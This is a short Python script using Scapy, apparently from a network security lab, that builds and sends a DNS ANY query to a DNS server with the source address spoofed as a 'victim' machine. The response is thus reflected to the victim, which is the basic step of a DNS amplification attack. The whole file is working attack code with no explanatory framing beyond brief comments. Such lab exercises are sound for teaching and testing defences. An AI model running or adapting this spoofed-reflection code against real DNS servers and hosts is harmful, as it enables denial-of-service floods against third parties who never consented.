from scapy.all import *

# Target DNS server IP (your local DNS server)
target_dns = "10.9.0.53"

# Spoofed IP of the victim machine (so response goes to them)
victim_ip = "10.9.0.5"

# Build the spoofed DNS ANY query packet
packet = IP(src=victim_ip, dst=target_dns) / \
         UDP(sport=RandShort(), dport=53) / \
         DNS(rd=1, qd=DNSQR(qname="example.com", qtype="ANY"))

# Send the packet
send(packet, verbose=1,count=1)

# Confirmation message
print("[+] Spoofed DNS query sent to", target_dns, "with victim IP", victim_ip)
